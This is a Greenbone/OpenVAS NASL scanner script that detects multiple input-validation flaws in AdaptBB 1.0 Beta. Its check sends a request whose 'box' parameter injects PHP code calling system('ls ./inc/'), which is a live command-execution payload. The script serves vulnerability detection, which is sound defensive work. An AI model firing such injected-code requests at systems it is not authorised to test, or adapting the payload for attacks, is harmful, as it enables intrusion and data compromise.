CPE = "cpe:/a:adaptbb:adaptbb";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100128" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2009-04-12 20:09:50 +0200 (Sun, 12 Apr 2009)" );
	script_bugtraq_id( 34452 );
	script_tag( name: "cvss_base", value: "9.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:C/I:C/A:C" );
	script_name( "AdaptBB Multiple Input Validation Vulnerabilities" );
	script_category( ACT_GATHER_INFO );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "adaptbb_detect.sc" );
	script_mandatory_keys( "adaptbb/installed" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "AdaptBB is prone to multiple security vulnerabilities because it fails to
  adequately sanitize user-supplied input. These vulnerabilities include multiple SQL-injection issues, an
  arbitrary-file-upload issue, and an arbitrary-command-execution issue." );
	script_tag( name: "impact", value: "Exploiting these issues can allow an attacker to upload and execute arbitrary
  files, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying
  database. Other attacks may also be possible." );
	script_tag( name: "affected", value: "AdaptBB 1.0 Beta is vulnerable. Other versions may also be affected." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/34452" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/index.php?do=profile&user=blabla&box=%3C?php%20echo%20%22%3Cpre%3E%22;%20system(%22ls%20./inc/%22);%20echo%20%22%3C/pre%3E%22;?%3E";
if(http_vuln_check( port: port, url: url, pattern: "dbinfo.php", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

